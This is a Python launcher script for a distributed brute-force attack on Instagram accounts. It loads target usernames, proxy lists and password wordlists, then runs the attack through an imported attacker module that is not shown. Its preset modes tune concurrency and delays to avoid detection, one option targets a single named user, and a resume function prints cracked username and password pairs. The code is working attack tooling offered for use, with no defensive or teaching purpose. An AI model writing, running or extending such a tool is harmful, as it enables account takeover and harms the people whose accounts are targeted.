#!/usr/bin/env python3
"""
🎀 Quick Launcher for Distributed Instagram Attack 💕
เรียกใช้งาน distributed attack ได้ง่ายๆ ด้วยคำสั่งเดียว!
"""

import asyncio
import sys
import os

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from distributed_instagram_attack import (
    DistributedInstagramAttacker,
    load_targets_from_file,
    load_proxies_from_file, 
    load_passwords_from_file,
    TargetConfig,
    ProxyConfig
)

class QuickLauncher:
    """🚀 Quick launcher with preset configurations"""
    
    @staticmethod
    def stealth_config():
        """🥷 Stealth configuration - slow but undetectable"""
        return {
            'max_concurrent': 10,
            'waves': 50,
            'delay_range': (5.0, 15.0),
            'description': '🥷 Stealth Mode - Low profile, high success rate'
        }
    
    @staticmethod
    def balanced_config():
        """⚖️ Balanced configuration - speed vs stealth"""
        return {
            'max_concurrent': 30,
            'waves': 20,
            'delay_range': (2.0, 5.0),
            'description': '⚖️ Balanced Mode - Good speed and stealth'
        }
    
    @staticmethod
    def aggressive_config():
        """🔥 Aggressive configuration - maximum speed"""
        return {
            'max_concurrent': 100,
            'waves': 10,
            'delay_range': (0.5, 2.0),
            'description': '🔥 Aggressive Mode - Maximum speed, high detection risk'
        }

async def quick_attack_specific_target(username: str, email: str = "unknown@example.com"):
    """🎯 Quick attack on specific target"""
    
    print(f"🎯 Quick Attack on: {username}")
    print("=" * 50)
    
    # Create single target
    targets = [TargetConfig(username, email)]
    
    # Load resources
    proxies = load_proxies_from_file('proxy_list.txt')
    passwords = load_passwords_from_file('passwords.txt')
    
    if not passwords:
        print("❌ No passwords found!")
        return
    
    # Use balanced configuration
    config = QuickLauncher.balanced_config()
    
    print(f"📊 Configuration: {config['description']}")
    print(f"🔑 Passwords: {len(passwords):,}")
    print(f"🌐 Proxies: {len(proxies)}")
    
    # Create attacker
    attacker = DistributedInstagramAttacker(
        targets=targets,
        proxies=proxies,
        password_list=passwords[:1000],  # Limit for quick test
        max_concurrent=config['max_concurrent'],
        delay_range=config['delay_range'],
        waves=config['waves']
    )
    
    # Execute attack
    await attacker.distributed_brute_force()

async def interactive_launcher():
    """💬 Interactive launcher with menu"""
    
    print("💕✨ DISTRIBUTED INSTAGRAM ATTACK LAUNCHER ✨💕")
    print("🎀 Choose your attack configuration 🎀")
    print()
    
    configs = {
        '1': QuickLauncher.stealth_config(),
        '2': QuickLauncher.balanced_config(), 
        '3': QuickLauncher.aggressive_config()
    }
    
    print("⚙️ ATTACK CONFIGURATIONS:")
    for key, config in configs.items():
        print(f"   {key}. {config['description']}")
        print(f"      Concurrent: {config['max_concurrent']} | Waves: {config['waves']} | Delay: {config['delay_range'][0]}-{config['delay_range'][1]}s")
    
    print("   4. 🎯 Quick target attack")
    print("   5. 📋 Full custom configuration")
    print()
    
    choice = input("Choose configuration (1-5): ").strip()
    
    if choice in configs:
        config = configs[choice]
        await run_with_config(config)
    elif choice == '4':
        username = input("🎯 Enter target username: ").strip()
        if username:
            await quick_attack_specific_target(username)
    elif choice == '5':
        await custom_launcher()
    else:
        print("❌ Invalid choice!")

async def run_with_config(config):
    """🚀 Run attack with specific configuration"""
    
    # Load all resources
    targets = load_targets_from_file('brute_targets.json')
    proxies = load_proxies_from_file('proxy_list.txt')
    passwords = load_passwords_from_file('passwords.txt')
    
    if not targets:
        print("❌ No targets loaded!")
        return
    
    if not passwords:
        print("❌ No passwords loaded!")
        return
    
    print(f"\n📊 {config['description']}")
    print(f"🎯 Targets: {len(targets)}")
    print(f"🔑 Passwords: {len(passwords):,}")
    print(f"🌐 Proxies: {len(proxies)}")
    
    # Confirm attack
    confirm = input(f"\n⚠️ Start attack? (y/N): ")
    if confirm.lower() != 'y':
        print("👋 Attack cancelled")
        return
    
    # Create and run attacker
    attacker = DistributedInstagramAttacker(
        targets=targets,
        proxies=proxies,
        password_list=passwords,
        max_concurrent=config['max_concurrent'],
        delay_range=config['delay_range'],
        waves=config['waves']
    )
    
    await attacker.distributed_brute_force()

async def custom_launcher():
    """🎨 Custom configuration launcher"""
    
    print("🎨 CUSTOM CONFIGURATION")
    print("=" * 30)
    
    # Load resources first
    targets = load_targets_from_file('brute_targets.json')
    proxies = load_proxies_from_file('proxy_list.txt')
    passwords = load_passwords_from_file('passwords.txt')
    
    if not targets or not passwords:
        print("❌ Missing required files!")
        return
    
    # Custom configuration input
    try:
        max_concurrent = int(input(f"🧵 Max concurrent (1-200, default=30): ") or "30")
        waves = int(input(f"🌊 Number of waves (1-100, default=20): ") or "20")
        min_delay = float(input(f"⏱️ Min delay (0.1-10, default=2.0): ") or "2.0")
        max_delay = float(input(f"⏱️ Max delay (0.5-30, default=5.0): ") or "5.0")
        
        # Validate ranges
        max_concurrent = max(1, min(200, max_concurrent))
        waves = max(1, min(100, waves))
        min_delay = max(0.1, min(10, min_delay))
        max_delay = max(0.5, min(30, max_delay))
        
        if max_delay <= min_delay:
            max_delay = min_delay + 1
        
        # Password limit
        max_passwords = int(input(f"🔑 Max passwords to test (1-{len(passwords)}, default=all): ") or str(len(passwords)))
        max_passwords = max(1, min(len(passwords), max_passwords))
        
        # Proxy usage
        use_proxies = input(f"🌐 Use {len(proxies)} proxies? (Y/n): ").strip().lower() != 'n'
        
        config = {
            'max_concurrent': max_concurrent,
            'waves': waves,
            'delay_range': (min_delay, max_delay),
            'description': f'🎨 Custom: {max_concurrent}c/{waves}w/{min_delay}-{max_delay}s'
        }
        
        print(f"\n📊 Custom Configuration:")
        print(f"   {config['description']}")
        print(f"   🎯 Targets: {len(targets)}")
        print(f"   🔑 Passwords: {max_passwords:,}")
        print(f"   🌐 Proxies: {len(proxies) if use_proxies else 0}")
        
        confirm = input(f"\n⚠️ Start custom attack? (y/N): ")
        if confirm.lower() != 'y':
            print("👋 Attack cancelled")
            return
        
        # Run attack
        attacker = DistributedInstagramAttacker(
            targets=targets,
            proxies=proxies if use_proxies else [],
            password_list=passwords[:max_passwords],
            max_concurrent=max_concurrent,
            delay_range=(min_delay, max_delay),
            waves=waves
        )
        
        await attacker.distributed_brute_force()
        
    except ValueError as e:
        print(f"❌ Invalid input: {e}")
    except KeyboardInterrupt:
        print(f"\n👋 Configuration cancelled")

async def resume_attack():
    """🔄 Resume previous attack from results"""
    
    print("🔄 RESUME PREVIOUS ATTACK")
    print("=" * 30)
    
    # Look for recent results
    import glob
    result_files = glob.glob('results/distributed/attack_report_*.json')
    
    if not result_files:
        print("❌ No previous attacks found!")
        return
    
    # Show recent attacks
    result_files.sort(reverse=True)
    print("📊 Recent attacks:")
    for i, file in enumerate(result_files[:5]):
        filename = os.path.basename(file)
        timestamp = filename.replace('attack_report_', '').replace('.json', '')
        print(f"   {i+1}. {timestamp}")
    
    try:
        choice = int(input("Select attack to resume (1-5): ")) - 1
        if 0 <= choice < len(result_files[:5]):
            # Load previous results and continue
            import json
            with open(result_files[choice], 'r') as f:
                previous_results = json.load(f)
            
            print(f"📊 Previous attack:")
            print(f"   Attempts: {previous_results['statistics']['total_attempts']}")
            print(f"   Success: {previous_results['statistics']['success_count']}")
            print(f"   Found: {len(previous_results['found_passwords'])} passwords")
            
            if previous_results['found_passwords']:
                print("🎉 Passwords found in previous attack:")
                for username, password in previous_results['found_passwords'].items():
                    print(f"   🔑 {username} : {password}")
                
                print("✅ Attack already successful!")
                return
            
            # TODO: Implement resume logic
            print("🔄 Resume functionality coming soon!")
            
    except (ValueError, IndexError):
        print("❌ Invalid selection!")

def main():
    """🎀 Main launcher function"""
    
    if len(sys.argv) > 1:
        # Command line arguments
        if sys.argv[1] == '--target':
            if len(sys.argv) > 2:
                username = sys.argv[2]
                email = sys.argv[3] if len(sys.argv) > 3 else "unknown@example.com"
                asyncio.run(quick_attack_specific_target(username, email))
            else:
                print("❌ Usage: python launcher.py --target <username> [email]")
        elif sys.argv[1] == '--stealth':
            asyncio.run(run_with_config(QuickLauncher.stealth_config()))
        elif sys.argv[1] == '--balanced':
            asyncio.run(run_with_config(QuickLauncher.balanced_config()))
        elif sys.argv[1] == '--aggressive':
            asyncio.run(run_with_config(QuickLauncher.aggressive_config()))
        elif sys.argv[1] == '--resume':
            asyncio.run(resume_attack())
        else:
            print("❌ Unknown argument. Use --target, --stealth, --balanced, --aggressive, or --resume")
    else:
        # Interactive mode
        try:
            asyncio.run(interactive_launcher())
        except KeyboardInterrupt:
            print(f"\n👋 Goodbye!")

if __name__ == "__main__":
    main()
